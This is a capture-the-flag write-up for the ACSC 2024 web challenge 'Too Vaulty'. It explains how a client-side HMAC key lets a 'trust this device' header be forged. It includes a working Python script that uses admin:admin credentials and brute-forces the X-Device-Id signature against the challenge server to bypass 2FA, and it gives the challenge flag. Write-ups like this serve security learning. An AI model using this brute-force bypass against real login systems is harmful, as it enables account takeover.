---
title: ACSC - [Too Vaulty]
tags:
  - CTF
  - Write-up
  - web-exploitation
  - acsc
  - server-side
  - black-box
  - 2fa-bypass
categories:
  - CTF
  - Write Up
---
![[Screenshot 2024-03-31 at 18.54.10.png]]
# Prologue
An online CTF competition by ACSC, this competition is qualification for competing in ICC for ASIA category.
# Write Up
## TL;DR Solution

The player guess an admin credentials, and brute-force the `X-Device-ID` signature to bypass 2FA
## Detailed Explanation

### Initial Analysis

We were given a black-box challenge, the feature consists of register, login, and 2FA.
![[Screenshot 2024-03-31 at 18.56.08.png]]

When we logged in, we were a given a dashboard where we can settings up 2FA and an information about our role.
![[Screenshot 2024-03-31 at 18.57.13.png]]

After setting up 2FA and tried to login, we were given a feature of `Trust only this device`. 
![[Screenshot 2024-03-31 at 19.06.40.png]]

Looking at traffic, there's a header `X-Device-Id`, which is not a default header.
![[Screenshot 2024-03-31 at 19.11.24.png]]

Looking at `login.js`, there's a logic of how this signature created

```js
document
  .getElementById("loginForm")
  .addEventListener("submit", function (event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const browser = bowser.getParser(window.navigator.userAgent);
    const browserObject = browser.getBrowser();
    const versionReg = browserObject.version.match(/^(\d+\.\d+)/); //[1]
    const version = versionReg ? versionReg[1] : "unknown";
    const deviceId = CryptoJS.HmacSHA1( 
      `${browserObject.name} ${version}`,
      "2846547907"
    ); //[2]

    fetch("/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Device-Id": deviceId,
      },
      body: JSON.stringify({ username, password }),
    })
      .then((response) => {
        if (response.redirected) {
          window.location.href = response.url;
        } else if (response.ok) {
          response.json().then((data) => {
            if (data.redirect) {
              window.location.href = data.redirect;
            } else {
              window.location.href = "/";
            }
          });
        } else {
          throw new Error("Login failed");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
      });
  });

function redirectToRegister() {
  window.location.href = "/register";
}
```

Basically, this signature only need a browser major and minor version [1], and then it will calculated with HMAC-SHA1 with browser name and version [2]. 

And if the signature correct, we don't need to verify 2FA anymore.
### Exploitation

Since there's role of `user`, I just assume there's an `admin` role too. I tried to login with common credentials `admin:admin` and the credentials is correct. But, this account is protected with 2FA.

![[Screenshot 2024-03-31 at 19.17.04.png]]

Since there's no rate limit and the signature is guessable, we can just make a script and brute-force it. 

```python
import requests
from hashlib import sha1
import re
url = "https://versionhistory.googleapis.com/v1/chrome/platforms/win/channels/stable/versions"

import hmac
def make_signature(message, key, hashlib_type):
    """
    works like CryptoJS.Hmac*
    js:
        >> CryptoJS.HmacSHA1(message, key).toString()
    py:
        >> make_signature(message, key, hashlib.sha1)
    """
    key = bytes(key, 'utf-8')
    message = bytes(message, 'utf-8')

    hashed = hmac.new(key, message, hashlib_type)
    return hashed.hexdigest()

a = requests.get(url).json()['versions']
r = re.compile(r"^(\d+\.\d+)")

sigs = []
for x in a:
    c = r.match(x['version']).group()
    z = make_signature(f"Chrome {c}", "2846547907", sha1)
    sigs.append(z)

sigs = list(set(sigs))
print((sigs))

for sig in sigs:
    burp0_url = "http://toofaulty.chal.2024.ctf.acsc.asia:80/login"
    burp0_json={"password": "admin", "username": "admin"}
    burp0_headers = {"X-Device-Id": sig}
    res = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
    if "Verify 2FA Code" not in res.text:
        print(sig, res.text)
        break
```

![[Screenshot 2024-03-31 at 19.30.10.png]]

FLAG: `ACSC{T0o_F4ulty_T0_B3_4dm1n}`







